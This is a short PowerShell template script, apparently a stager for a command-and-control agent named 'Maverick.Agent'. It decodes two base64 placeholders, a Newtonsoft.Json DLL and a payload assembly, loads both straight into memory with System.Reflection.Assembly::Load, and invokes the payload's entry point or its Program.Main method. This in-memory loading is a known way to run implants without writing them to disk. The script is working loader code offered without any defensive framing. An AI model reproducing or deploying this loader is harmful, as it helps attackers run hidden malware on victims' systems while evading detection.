$__PayloadTemplate__ = @"
__PAYLOAD_B64__
"@

$__NewtonSoft__ = @"
__DLL_NEWTONSOFT_B64__
"@

[System.Reflection.Assembly]::Load([Convert]::FromBase64String($__NewtonSoft__))

$__Assembly__ = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($__PayloadTemplate__))

$__Entry__ = $__Assembly__.EntryPoint

if ($__Entry__ -ne $null)
{
    $__paramCount__ = $__Entry__.GetParameters().Count

    if($__paramCount__ -eq 0)
    {
        $__Entry__.Invoke($null, @())
    }
    else
    {
        $__argsArray__ = [string[]]@()
        $__Entry__.Invoke($null, @($__argsArray__))
    }
}
else 
{
    $__type__ = $__Assembly__.GetType("Maverick.Agent.Program")
    if ($__type__ -eq $null) { throw "Type Program not found" }

    $__meth__ = $__type__.GetMethod("Main")
    if ($__meth__ -eq $null) { throw "Method Main not found" }

    $__meth__.Invoke($null, @())
}

